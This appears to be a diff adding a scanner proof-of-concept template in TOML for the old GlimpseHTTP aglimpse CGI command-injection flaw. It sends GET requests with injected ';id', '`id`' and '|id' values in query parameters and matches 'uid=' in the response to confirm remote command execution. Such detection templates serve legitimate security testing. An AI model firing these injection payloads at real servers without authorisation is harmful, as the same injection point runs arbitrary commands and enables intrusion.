@@ -1,0 +1,96 @@
+[info]
+id = "POC-AVE-1999-0209"
+name = "GlimpseHTTP aglimpse CGI 远程命令执行 PoC"
+author = "AVE"
+severity = "high"
+tags = ["rce", "cgi", "command-injection", "glimpse"]
+description = "检测 GlimpseHTTP 中 aglimpse CGI 程序是否存在远程命令执行漏洞。通过向 aglimpse 提交包含命令注入 payload 的查询参数，检测是否能在服务器端执行任意命令。"
+vuln_id = ["CVE-1999-0147", "AVE-1999-0209"]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "GET"
+path = "/cgi-bin/aglimpse"
+query.query = "test"
+headers = { "User-Agent" = "Mozilla/4.0" }
+
+[[poc.requests.matchers]]
+type = "status"
+status = [200]
+expect = true
+
+[[poc.requests.matchers]]
+type = "word"
+part = "body"
+words = ["aglimpse", "Glimpse", "Query", "query", "result", "matches"]
+expect = true
+
+[[poc.requests]]
+method = "GET"
+path = "/cgi-bin/aglimpse"
+query.query = ";id"
+headers = { "User-Agent" = "Mozilla/4.0" }
+
+[[poc.requests.matchers]]
+type = "status"
+status = [200]
+expect = true
+
+[[poc.requests.matchers]]
+type = "word"
+part = "body"
+words = ["uid=", "gid=", "groups="]
+expect = true
+
+[[poc.requests]]
+method = "GET"
+path = "/cgi-bin/aglimpse"
+query.q = "`id`"
+headers = { "User-Agent" = "Mozilla/4.0" }
+
+[[poc.requests.matchers]]
+type = "status"
+status = [200]
+expect = true
+
+[[poc.requests.matchers]]
+type = "word"
+part = "body"
+words = ["uid=", "gid=", "groups="]
+expect = true
+
+[[poc.requests]]
+method = "GET"
+path = "/cgi-bin/aglimpse"
+query.query = "|id"
+headers = { "User-Agent" = "Mozilla/4.0" }
+
+[[poc.requests.matchers]]
+type = "status"
+status = [200]
+expect = true
+
+[[poc.requests.matchers]]
+type = "word"
+part = "body"
+words = ["uid=", "gid=", "groups="]
+expect = true
+
+[[poc.requests]]
+method = "GET"
+path = "/cgi-bin/aglimpse/query"
+query.query = ";id"
+headers = { "User-Agent" = "Mozilla/4.0" }
+
+[[poc.requests.matchers]]
+type = "status"
+status = [200]
+expect = true
+
+[[poc.requests.matchers]]
+type = "word"
+part = "body"
+words = ["uid=", "gid=", "groups="]
+expect = true
